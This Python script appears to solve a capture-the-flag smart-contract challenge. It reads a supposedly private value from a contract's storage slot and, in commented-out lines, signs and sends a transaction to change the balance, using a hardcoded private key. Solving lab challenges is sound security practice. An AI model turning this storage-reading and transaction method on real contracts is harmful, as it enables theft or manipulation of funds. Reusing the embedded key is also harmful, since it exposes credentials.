import json
from web3 import Web3, HTTPProvider

client = Web3(HTTPProvider("http://awesome.chall.seetf.sg:40002/"))

target = "0x8E13df48763E76168e70ad3c49F54b3ab3636e5D"

with open("smart_contracts\writeups\challange2_abi.json", "r") as file:
# with open("challange2_abi.json", "r") as file:
    target_abi = json.load(file)

target_contract = client.eth.contract(address=target, abi=target_abi)

nonce = client.eth.get_transaction_count(target)

balance_amount_byte = client.eth.get_storage_at(target, 0)

balance_amount = int.from_bytes(balance_amount_byte, "big")

target_balance = 1337

# The result is balanceAmount = 273.
print(f"The target balance amount is: {balance_amount}.")

increase_amount = target_balance - balance_amount

print(f"The target increasing amount is: {increase_amount}.")

# private_key = "0x01f5a8dad7d09a87f1d2495853fab55c590697e4d8a3e77763770066efc48cec"
# pub_key = "0xf4bA714B856fD6733113b1eAA4e1D041500638Ce"

# txn = target_contract.functions.increaseBalance(increase_amount).buildTransaction({
#         'chainId': 1337,
#         'gas': 700000,
#         'maxFeePerGas': client.toWei('2', 'gwei'),
#         'maxPriorityFeePerGas': client.toWei('1', 'gwei'),
#         'from': pub_key,
#         'nonce': nonce,
#     }
# )

# signed_txn = client.eth.account.sign_transaction(txn, private_key=private_key)

# client.eth.send_raw_transaction(signed_txn.rawTransaction)

# print(f"Finished sending txn, hash: {signed_txn.hash}")
